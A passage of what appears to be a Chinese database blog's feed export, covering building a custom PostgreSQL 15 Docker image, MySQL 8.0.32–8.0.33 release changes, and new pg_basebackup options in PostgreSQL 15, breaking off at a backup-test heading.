<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PGDATA</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">mkdir</span> <span class="string">-p</span> <span class="string">/var/lib/pgsql/15/data</span> <span class="string">&amp;&amp;</span> <span class="string">chown</span> <span class="string">-R</span> <span class="string">postgres:postgres</span> <span class="string">/var/lib/pgsql</span></span><br><span class="line"><span class="string">ENV</span> <span class="string">PGDATA=/var/lib/pgsql/15/data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Init</span></span><br><span class="line"><span class="string">ENV</span> <span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/postgresql/bin</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">su</span> <span class="string">-l</span> <span class="string">postgres</span> <span class="string">-c</span> <span class="string">&quot;initdb --pgdata=&#x27;$PGDATA&#x27;&quot;</span> <span class="number">2</span><span class="string">&gt;&amp;1</span> <span class="string">&lt;</span> <span class="string">/dev/null</span></span><br></pre></td></tr></table></figure></div>
<p>这样，当运行 docker image 时，镜像里的 PostgreSQL 就已经初始化完成，可以直接使用，而不需要进入容器再次调整。</p>
<h3 id="6-暴露-5432-端口，准备启动-PostgreSQL-服务">6. 暴露 5432 端口，准备启动 PostgreSQL 服务</h3>
<p>PG 默认使用 5432 端口，如果是实验环境则无需更改。更进一步，这个端口是启动后容器的端口，可通过 &lt;容器IP:5432 &gt; 直接访问容器里的 PG，而非宿主机上的端口，如需绑定到宿主机上的 5432 端口，则需要在启动容器上，传参 <code>-p 5432:5432</code>。还有一点好处是，可以同时运行若干容器，端口均为 5432，且不会冲突。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Port</span></span><br><span class="line"><span class="string">EXPOSE</span> <span class="number">5432</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start PostgreSQL</span></span><br><span class="line"><span class="string">CMD</span> [<span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;/var/lib/pgsql/15/data&quot;</span>]</span><br></pre></td></tr></table></figure></div>
<p>到此，自定义的 PostgreSQL 15 编译版 Dockerfile 已定制完成。</p>
<h2 id="构建-PostgreSQL-15-镜像">构建 PostgreSQL 15 镜像</h2>
<p>Dockerfile 是核心，构建步骤很简单，只需要应用刚才的 dockfile 即可，剩下的交给 Docker。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t my-postgresql:15.2 .</span><br></pre></td></tr></table></figure></div>
<p>build 时传参 <code>-t</code> 可以将生成的镜像打上标签和版本号。</p>
<img  alt="p3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-9f1f886b-06ba-48e6-a69a-d4ccda94e102.png"
                      referrerpolicy="no-referrer"
                >
<p>镜像构建完成后，可使用 <code>docker images</code> 查看镜像。</p>
<p>拉取 PostgreSQL 官方镜像，对比可以发现自定义的镜像文件比官方镜像大 200MB 多。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 docker]# docker images</span><br><span class="line">REPOSITORY      TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">my-postgresql   15.2      7028a1396388   14 hours ago   633MB</span><br><span class="line">postgres        latest    3b6645d2c145   2 weeks ago    379MB</span><br></pre></td></tr></table></figure></div>
<h2 id="运行-PostgreSQL-容器">运行 PostgreSQL 容器</h2>
<p>可以指定镜像直接启动容器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 docker]# docker run -d my-postgresql:15.2</span><br><span class="line">a0ed010c3f0252614f2840dd7485190be6f708066e8822bb10b219e5342474e5</span><br><span class="line">[root@centos7 docker]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS      NAMES</span><br><span class="line">a0ed010c3f02   my-postgresql:15.2   &quot;postgres -D /var/li…&quot;   4 seconds ago   Up 3 seconds   5432/tcp   intelligent_perlman</span><br></pre></td></tr></table></figure></div>
<p>也可以指定名称启动容器，但要注意 name 需要放到镜像名前：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 docker]# docker run --name pg15 -d my-postgresql:15.2</span><br><span class="line">35d5cdcf4e375d6e1be3bd07730c4774fc58cb3f9586d1c44a4cb81fddcb38d9</span><br><span class="line">[root@centos7 docker]# docker run --name s1 -d my-postgresql:15.2</span><br><span class="line">05ffd0e594d35fc05175e92a1f6919f16fcaa48be6237271e4273ce2097c97a7</span><br><span class="line">[root@centos7 docker]# docker run --name s2 -d my-postgresql:15.2</span><br><span class="line">7ca429feae556ec16bc197f9bac6e0590d28b7b50479f5d1ef88c853689d7858</span><br><span class="line">[root@centos7 docker]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES</span><br><span class="line">7ca429feae55   my-postgresql:15.2   &quot;postgres -D /var/li…&quot;   3 seconds ago    Up 2 seconds    5432/tcp   s2</span><br><span class="line">05ffd0e594d3   my-postgresql:15.2   &quot;postgres -D /var/li…&quot;   18 seconds ago   Up 16 seconds   5432/tcp   s1</span><br><span class="line">35d5cdcf4e37   my-postgresql:15.2   &quot;postgres -D /var/li…&quot;   28 seconds ago   Up 27 seconds   5432/tcp   pg15</span><br></pre></td></tr></table></figure></div>
<p>可直接连接容器里的 postgresql：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it pg15 psql</span><br></pre></td></tr></table></figure></div>
<img  alt="p4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-499fdabd-e0df-4593-b333-194c7010ad0f.png"
                      referrerpolicy="no-referrer"
                >
<p>也可使用本地 psql 客户端连接容器，但需先确认容器的 IP，或者在启动容器前传参绑定端口：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">psql -h 172.17.0.3</span><br></pre></td></tr></table></figure></div>
<img  alt="p5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-b8fe6443-a3b3-4c05-a301-dd96f840e025.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="后续">后续</h2>
<p>定制容器可以做的事情还很多，比如：</p>
<ol>
<li>内置数据库、用户，开箱即用</li>
<li>最短时间、最小资源启动主从复制，或配置高可用架构</li>
<li>可反复创建、销毁容器，作为实验环境不断练习</li>
</ol>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/619355" >https://www.modb.pro/db/619355 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2508" >https://pgfans.cn/a/2508 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>dockerfile</tag>
        <tag>postgresql</tag>
        <tag>compile</tag>
        <tag>postgresql 15</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 升级：MySQL Server 变更详解 (8.0.32 ~ 8.0.33)</title>
    <url>/2024/mysql/mysql-upgrade-change-2023-1/</url>
    <content><![CDATA[<p>MySQL Server 的持续更新为数据库管理员和开发者带来了一系列的改进、新特性和安全性增强。</p>
<p>2023 年上半年，MySQL Server 共发布了两个版本：</p>
<ol>
<li>MySQL 8.0.32 (2023-01-17)</li>
<li>MySQL 8.0.33 (2023-04-18)</li>
</ol>
<p>本文将详细探讨 MySQL 8.0.32 和 8.0.33，这两个版本的关键变更，帮助用户了解这些更新对现有系统可能产生的影响，并为升级做好准备。</p>
<h2 id="重要变更">重要变更</h2>
<ol>
<li>
<p>在 8.0.32 中，系统变量 <code>max_join_size</code> 的行为得到了修正，现在它直接限制基础表中的最大行访问次数，而不是之前的估计成本。<br>
如果估算需要从基础表中读取更多行，将引发错误。这一变更使得该变量的行为与其文档描述更加一致，有助于防止大型查询的意外执行。</p>
</li>
<li>
<p>在 8.0.32 中，新增系统变量 <code>explain_format</code>，可选值为 TRADITIONAL (默认)，JSON，TREE。</p>
</li>
</ol>
<blockquote>
<p>扩展</p>
</blockquote>
<p><code>explain_format</code> 用在显示查询执行计划，缺少 FORMAT 选项时，EXPLAIN 使用的默认输出格式。</p>
<p>举个栗子，系统变量 <code>explain_format</code> 已经预设为 json 格式，查看执行计划的输出格式。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@explain_format;</span><br><span class="line">+------------------+</span><br><span class="line">| @@explain_format |</span><br><span class="line">+------------------+</span><br><span class="line">| JSON             |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain select 1\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">EXPLAIN: &#123;</span><br><span class="line">  &quot;query_block&quot;: &#123;</span><br><span class="line">    &quot;select_id&quot;: 1,</span><br><span class="line">    &quot;message&quot;: &quot;No tables used&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">Note (Code 1003): /* select#1 */ select 1 AS `1`</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></div>
<h2 id="InnoDB-引擎">InnoDB 引擎</h2>
<p>在 MySQL 8.0.32 中，修复了如下问题：</p>
<ol>
<li>修复了从 8.0.28 版本升级后可能出现的未检测到的问题、崩溃和损坏。</li>
<li>新增列使用 <code>ALGORITHM=INSTANT</code> 时，如果行的最大可能大小超过行大小限制，将失败。</li>
<li>修复了 <code>SHOW ENGINE INNODB STATUS</code> 中的乱码 UTF 字符问题。</li>
<li>实现了多个自适应哈希索引 adaptive hash index（AHI）代码优化和改进。</li>
</ol>
<h2 id="复制">复制</h2>
<p>在 MySQL 8.0.32 中，修复了如下问题：</p>
<ol>
<li>修复了 <code>SOURCE_HEARTBEAT_PERIOD</code> 设置过小时（比如 1 ms）的二进制日志转储问题。</li>
<li>修复了设置 <code>--server-id=0</code> 后尝试更改服务器 ID 导致的一系列问题。</li>
<li>修复了压缩二进制日志事件复制时的中继日志位置更新问题。</li>
</ol>
<blockquote>
<p>扩展</p>
</blockquote>
<p><code>SOURCE_HEARTBEAT_PERIOD</code> 是 <code>CHANGE REPLICATION SOURCE TO</code> 语句的一个选项，<br>
用于控制心跳间隔，如果连接仍然良好，则停止在没有数据的情况下发生连接超时。<br>
间隔为 0 时，表示完全禁用心跳。</p>
<h2 id="JSON-函数">JSON 函数</h2>
<p>在 MySQL 8.0.32 中，修复了如下问题：</p>
<ol>
<li>修复了 JSON_ARRAYAGG() 和 JSON_OBJECTAGG() 函数在保存结果时丢失数据类型信息的问题。</li>
</ol>
<h2 id="性能改进">性能改进</h2>
<ol>
<li>MySQL 8.0.32，改进了内部临时表的资源分配处理。</li>
</ol>
<blockquote>
<p>扩展</p>
</blockquote>
<p>MySQL 的内部临时表分为 In-Memory 和 On-Disk 两种，<br>
其中，In-Memory 内部临时表可用 TempTable 和 MEMORY 两种存储引擎。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@internal_tmp_mem_storage_engine;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| @@internal_tmp_mem_storage_engine |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| TempTable                         |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>On-Disk 内部临时表可用 InnoDB 和 MyISAM 两种存储引擎，从 MySQL 8.0.16 开始，只能用 InnoDB 引擎。<br>
且系统参数 <code>internal_tmp_disk_storage_engine</code> 被移除。</p>
<ol start="2">
<li>新增了 Performance Schema Server Telemetry Traces 服务，提供了一种插件和组件检索与 SQL 语句生命周期相关通知的方式。</li>
</ol>
<blockquote>
<p>扩展</p>
</blockquote>
<p>在 MySQL 8.0.33 版本中，搭配新的遥测功能，而新增了 <code>TELEMETRY_LOG_ADMIN</code> 权限，它允许用户配置和管理遥测日志。<br>
遥测日志是 MySQL 服务器的一个功能，它可以记录有关服务器操作和性能的详细信息，这些信息对于监控、诊断和优化数据库性能非常有用。</p>
<p>拥有 <code>TELEMETRY_LOG_ADMIN</code> 权限的用户可以执行以下操作：</p>
<ol>
<li>配置遥测日志：用户可以设置遥测日志的配置参数，例如启用或禁用遥测日志记录、设置日志级别、指定日志文件的位置等。</li>
<li>管理遥测日志数据：用户可以查看、旋转（切换）遥测日志文件，以及执行与遥测日志相关的其他管理任务。</li>
<li>访问遥测日志信息：用户可以查询遥测日志中记录的数据，以便进行分析和报告。</li>
</ol>
<p>需要注意的是，<code>TELEMETRY_LOG_ADMIN</code> 权限是由 <code>telemetry_log</code> 插件定义的，该插件在 MySQL HeatWave 服务上部署时独家使用。<br>
这意味着，这个权限主要与 MySQL HeatWave 相关的环境和部署有关，可能不适用于所有 MySQL 部署。</p>
<p>在实际使用中，管理员可以根据需要将 <code>TELEMETRY_LOG_ADMIN</code> 权限授予给需要管理遥测日志的用户，以便他们能够有效地监控和维护数据库系统。</p>
<h2 id="依赖库">依赖库</h2>
<ol>
<li>MySQL 8.0.32，升级了捆绑的 zlib 库到 1.2.13 版本。</li>
<li>二进制包中包含的 curl 已升级至 7.86.0 版本。</li>
<li>MySQL 8.0.33，对于捆绑 OpenSSL 库的平台，MySQL Server 链接的 OpenSSL 库已更新至 1.1.1t 版本。</li>
</ol>
<h2 id="审计-MySQL-Enterprise-Audit">审计 (MySQL Enterprise Audit)</h2>
<ol>
<li>MySQL 8.0.33，新的 <code>audit_log_database</code> 系统变量允许在全局模式命名空间中的其他数据库指定为审计日志的存储位置，默认为 <code>mysql</code> 库。</li>
</ol>
<p>比如，可以新建一个专门用于审计的 <code>audit</code> 库，将审计日志存放于该库中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from audit.audit_log_user;</span><br></pre></td></tr></table></figure></div>
<h2 id="组件">组件</h2>
<ol>
<li>
<p>MySQL 8.0.32，MySQL Enterprise Edition 现在提供基于组件的数据掩码和去标识化功能，而不是基于插件库。</p>
</li>
<li>
<p>MySQL 8.0.33，<code>INSTALL COMPONENT</code> 现在包括 SET 子句，可以在安装一个或多个组件时设置组件系统变量的值。</p>
</li>
</ol>
<p>例如，</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">INSTALL COMPONENT <span class="string">&#x27;file://component1&#x27;</span>, <span class="string">&#x27;file://component2&#x27;</span> </span><br><span class="line">    <span class="keyword">SET</span> <span class="keyword">GLOBAL</span> component1.var1 <span class="operator">=</span> <span class="number">12</span> <span class="operator">+</span> <span class="number">3</span>, PERSIST component2.var2 <span class="operator">=</span> <span class="string">&#x27;strings&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>随着 MySQL Server 8.0.32 到 8.0.33 的发布，用户可以期待更稳定、安全和高效的数据库操作体验。</p>
<p>在升级到此版本之前，建议用户详细阅读发布说明，评估影响，并在生产环境中进行充分的测试。</p>
<p>对于弃用的功能，用户应当开始规划迁移到其他支持的功能或方法上，以确保平滑过渡到未来的 MySQL 版本。</p>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>upgrade</tag>
        <tag>mysql</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】pg_basebackup 在 PostgreSQL 15 中的新特性</title>
    <url>/2023/postgresql/pg-15-pg-basebackup-new-feature/</url>
    <content><![CDATA[<img  alt="output.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230315-98a165c9-1afe-4190-a12b-e0fe3530c863.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="pg-basebackup-介绍">pg_basebackup 介绍</h2>
<p>pg_basebackup 是一个 PostgreSQL 内置工具，用于创建 PostgreSQL 主服务器的二进制备份，包括主服务器上的所有数据和 WAL 日志。它可以在从服务器上执行，以创建一个完整的 PostgreSQL 数据库副本，也可以在主服务器上执行，以创建一个文件系统级别的备份。</p>
<h2 id="pg-basebackup-常用参数">pg_basebackup 常用参数</h2>
<p>常用参数阐述：</p>
<p>-D, --pgdata=DIRECTORY 存放备份文件目录<br>
-F, --format=p|t       输出格式(plain(默认)，tar)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果选t格式，则将数据目录打成tar包</span></span><br><span class="line">-rw------- 1 postgres postgres 1.0K Mar 15 17:36 16494.tar</span><br><span class="line">-rw------- 1 postgres postgres 226K Mar 15 17:36 backup_manifest</span><br><span class="line">-rw------- 1 postgres postgres 184M Mar 15 17:36 base.tar</span><br><span class="line">-rw------- 1 postgres postgres  17M Mar 15 17:36 pg_wal.tar</span><br></pre></td></tr></table></figure></div>
<p>-r, --max-rate=RATE    传输数据目录的最大传输速率(单位为kB/s，或以“k”或“M”为后缀)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可用于跨机器备份，限制备份速度，以控制备份对网络带宽的影响；或控制备份时导出落盘的速度，以防止出现IO打满的情况</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pg_basebackup -D /opt/pgsql-152/backup -Fp -Xs -l <span class="string">&#x27;backup_plain&#x27;</span> -P -v -r 10M</span></span><br><span class="line">pg_basebackup: initiating base backup, waiting for checkpoint to complete</span><br><span class="line">pg_basebackup: checkpoint completed</span><br><span class="line">pg_basebackup: write-ahead log start point: 0/27000028 on timeline 1</span><br><span class="line">pg_basebackup: starting background WAL receiver</span><br><span class="line">pg_basebackup: created temporary replication slot &quot;pg_basebackup_3768708&quot;</span><br><span class="line">10820/187431 kB (5%), 1/2 tablespaces (/opt/pgsql-152/backup/base/4/2608  )</span><br><span class="line">21323/187431 kB (11%), 1/2 tablespaces (/opt/pgsql-152/backup/base/5/2675  )</span><br><span class="line">42885/187431 kB (22%), 1/2 tablespaces (/opt/pgsql-152/backup/base/5/16509 )</span><br><span class="line">187445/187445 kB (100%), 2/2 tablespaces</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>-P, --progress         显示进度信息<br>
-v, --verbose          输出详细消息<br>
-R, --write-recovery-conf 为复制写配置</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会在备份目录自动创建名为 standby.signal 的空文件，并自动在文件 postgresql.auto.conf 中加入 primary_conninfo 信息</span></span><br><span class="line">-rw------- 1 postgres postgres    567 Mar 15 17:55 postgresql.auto.conf</span><br><span class="line">-rw------- 1 postgres postgres      0 Mar 15 17:55 standby.signal</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep primary_conninfo postgresql.auto.conf</span></span><br><span class="line">primary_conninfo = &#x27;user=postgres passfile=&#x27;&#x27;/home/postgres/.pgpass&#x27;&#x27; channel_binding=disable port=5432 sslmode=disable sslcompression=0 sslsni=1 ssl_min_protocol_version=TLSv1.2 gssencmode=disable krbsrvname=postgres target_session_attrs=any&#x27;</span><br></pre></td></tr></table></figure></div>
<p><strong>额外的，关于 <code>primary_conninfo</code> 参数，补充说明其包含字段的解释：</strong></p>
<ul>
<li>passfile</li>
</ul>
<p>密码文件，用于存放用户登陆信息，格式为 <code>hostname:port:database:username:password</code>， 在 Unix 系统，该文件权限需为 <code>0600</code>，否则会被忽略。</p>
<p>如果文件权限大于 <code>0600</code>，当连接数据库时，会触发 WARN 警告。且该文件存储的是明文密码，从安全角度来讲，并不建议使用。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> .pgpass</span></span><br><span class="line">*:5432:*:sbtest:sbtest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql -Usbtest -h192.168.8.11</span></span><br><span class="line">WARNING: password file &quot;/home/postgres/.pgpass&quot; has group or world access; permissions should be u=rw (0600) or less</span><br><span class="line">Password for user sbtest:</span><br></pre></td></tr></table></figure></div>
<ul>
<li>channel_binding</li>
</ul>
<p>可以让客户端指定通道绑定作为 SCRAM 的组成部分， 并且，使用一个含密码保护的 TLS 证书的客户端现在可以通过 sslpassword 参数来指定密码。PostgreSQL现在也支持 DER 算法编码的证书。这是 PostgreSQL 13 引入的参数。</p>
<ul>
<li>gssencmode</li>
</ul>
<p>此选项决定是否与服务器协商安全的 GSS TCP/IP 连接，或者以何种优先级进行协商。 有三种模式: disable/prefer (default)/require</p>
<ul>
<li>target_session_attrs</li>
</ul>
<p>从 <strong>PostgreSQL 10</strong> 开始可以支持在 libpq 中连接多个实例的设置，在 PG 10 中，支持两个选项：</p>
<ul>
<li>any (default) 可连任意数据库实例</li>
<li>read-write 默认情况下会话只接受读写事务 （主机不支持 hot standby 模式， default_transaction_read_only = off）</li>
</ul>
<p>但是从 <strong>PostgreSQL 14</strong> 开始，支持 6 个选项（新增4个选项）：</p>
<ul>
<li>read-only 默认情况下会话不能接受读写事务</li>
<li>primary 服务器不能处于 hot standby 模式</li>
<li>standby 服务器必须处于 hot standby 模式</li>
<li>prefer-standby 首先尝试寻找备机，但如果列出的主机都不是备机，就在 any 模式下再次尝试</li>
</ul>
<p>使用方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">host=host1 target_session_attrs=any</span><br><span class="line">postgresql://host1:port2,host2:port2/?target_session_attrs=read-write</span><br></pre></td></tr></table></figure></div>
<p>更多讨论：<br>
<a class="link"   href="https://www.postgresql.org/message-id/CAF3+xM+8-ztOkaV9gHiJ3wfgENTq97QcjXQt+rbFQ6F7oNzt9A@mail.gmail.com" >https://www.postgresql.org/message-id/CAF3+xM+8-ztOkaV9gHiJ3wfgENTq97QcjXQt+rbFQ6F7oNzt9A@mail.gmail.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>Recently I put a proposal to support ‘prefer-read’ parameter in<br>
target_session_attrs in libpq. Now I updated the patch with adding content<br>
in the sgml and regression test case.</p>
</blockquote>
<h2 id="pg-basebackup-在-PostgreSQL-15-中的更新">pg_basebackup 在 PostgreSQL 15 中的更新</h2>
<h3 id="LZ4-zstd">LZ4 &amp; zstd</h3>
<ul>
<li>
<p><a class="link"   href="https://www.postgresql.org/docs/release/15.0/" >[15.0] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> More options for compression, including support for Zstandard (zstd) compression. This includes support for performing compression on the server side during <a class="link"   href="https://www.postgresql.org/docs/15/app-pgbasebackup.html" >pg_basebackup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
</li>
<li>
<p>Add support for LZ4 and Zstandard compression of server-side base backups (Jeevan Ladhe, Robert Haas)</p>
</li>
<li>
<p>Allow pg_basebackup to do server-side gzip, LZ4, and Zstandard compression and client-side LZ4 and Zstandard compression of base backup files (Dipesh Pandit, Jeevan Ladhe)</p>
<p>Client-side gzip compression was already supported.</p>
<p><a class="link"   href="https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=0ad8032910d5eb8efd32867c45b6a25c85e60f50" >https://git.postgresql.org/gitweb/?p=postgresql.git;a=commitdiff;h=0ad8032910d5eb8efd32867c45b6a25c85e60f50 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li>
<p>Allow pg_basebackup to compress on the server side and decompress on the client side before storage (Dipesh Pandit)</p>
<p>This is accomplished by specifying compression on the server side and plain output format.</p>
</li>
<li>
<p>Allow pg_basebackup’s <code>--compress</code> option to control the compression location (server or client), compression method, and compression options (Michael Paquier, Robert Haas)</p>
</li>
</ul>
<p><strong>批注：</strong></p>
<ol>
<li>增加了两种压缩模式，支持 LZ4 和 zstd 压缩模式，编译时需要添加参数 <code>--with-lz4 --with-zstd</code> 以支持该特性。</li>
<li>支持 server 端压缩（gzip/LZ4/zstd），或者 client 端进行压缩（gzip/LZ4/zstd）。</li>
<li>强化 <code>-Z, --compress</code> 参数，支持多种详细描述，比如 <code>-Z server-zstd:2</code>，在服务器端使用 zstd 算法压缩。</li>
</ol>
<h3 id="target">target</h3>
<ul>
<li>Add new pg_basebackup option <code>--target</code> to control the base backup location (Robert Haas)</li>
</ul>
<p>The new options are server to write the backup locally and blackhole to discard the backup (for testing).</p>
<pre><code>Instructs the server where to place the base backup. The default target is client, which specifies that the backup should be sent to the machine where pg_basebackup is running. If the target is instead set to server:/some/path, the backup will be stored on the machine where the server is running in the /some/path directory. Storing a backup on the server requires superuser privileges or having privileges of the pg_write_server_files role. If the target is set to blackhole, the contents are discarded and not stored anywhere. This should only be used for testing purposes, as you will not end up with an actual backup.

Since WAL streaming is implemented by pg_basebackup rather than by the server, this option cannot be used together with -Xstream. Since that is the default, when this option is specified, you must also specify either -Xfetch or -Xnone.
</code></pre>
<p><strong>批注：</strong></p>
<ol>
<li>在服务器上存储备份需要超级用户权限或具有pg_write_server_files角色的权限。 如果目标设置为黑洞，则内容将被丢弃，不存储在任何地方。 这应该只用于测试目的，因为您最终不会得到实际的备份。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pg_basebackup --target=blackhole --wal-method=none</span><br><span class="line">NOTICE:  all required WAL segments have been archived</span><br></pre></td></tr></table></figure></div>
<p>运行此命令后，并不会得到实际的备份集。</p>
<ol start="2">
<li>如果将目标设定为 <code>server:/some/path</code>，其效果与 <code>-D backup -Ft</code> 类似。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pg_basebackup --target=server:/opt/pgsql-152/backup --wal-method=none</span><br><span class="line"></span><br><span class="line">$ pg_basebackup -D /opt/pgsql-152/backup -Ft --wal-method=none</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>推测：或可支持备份至 S3 路径。</li>
</ol>
<h3 id="LZ4">LZ4</h3>
<p>LZ4 是一种无损数据压缩算法，由Yann Collet于2011年开发。它可以实现非常快速的压缩和解压缩速度，同时提供比LZO、Snappy和Zlib等其他压缩算法更高的压缩比。</p>
<p>LZ4 算法的压缩和解压缩过程基于哈希表和字典序列的概念。它将输入数据分割成若干个片段，每个片段分别使用一个字典来进行压缩。在压缩过程中，LZ4 算法会将输入数据分成长度相等的子块，并利用这些子块之间的重叠来实现更高的压缩比。在解压缩过程中，LZ4 算法使用相同的字典来逆向生成原始数据。</p>
<p>LZ4 算法的特点是快速、简单和高效。在多核CPU上可以并行化，同时支持多种压缩级别和压缩块大小的设置。LZ4算法常被用于高速数据传输和实时数据处理领域，例如网络传输、分布式存储、日志处理、大数据分析等场景。在 PostgreSQL 数据库中，LZ4算法也是一种常用的数据压缩方式，可以用于减少数据库的存储空间和提高数据传输速度。</p>
<p><strong>在 PostgreSQL 15 中，如果采用编译安装，需要添加选项 <code>--with-lz4</code>。</strong></p>
<p>LZ4 源码仓库：<a class="link"   href="https://github.com/lz4/lz4" >https://github.com/lz4/lz4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="zstd">zstd</h3>
<p>Zstandard，或简称zstd，是一种快速无损压缩算法，针对实时压缩场景在zlib级别和更好的压缩比。 它有一个非常快的熵阶段，由Huff0和FSE库提供。</p>
<p>Zstandard的格式是稳定的，并记录在RFC8878中。 多个独立的实现已经可用。 这个存储库代表了参考实现，作为一个开源的双BSD和GPLv2许可的C库提供，以及一个生成和解码.zst、.gz、.xz和.lz4文件的命令行实用程序。</p>
<p><strong>在 PostgreSQL 15 中，如果采用编译安装，需要添加选项 <code>--with-zstd</code>。</strong></p>
<p>zstd 源码仓库：<a class="link"   href="https://github.com/facebook/zstd" >https://github.com/facebook/zstd <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230315-ce1064d2-a373-48ed-9840-aee0f94d15d7.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="备份测试">备份测试</h3>
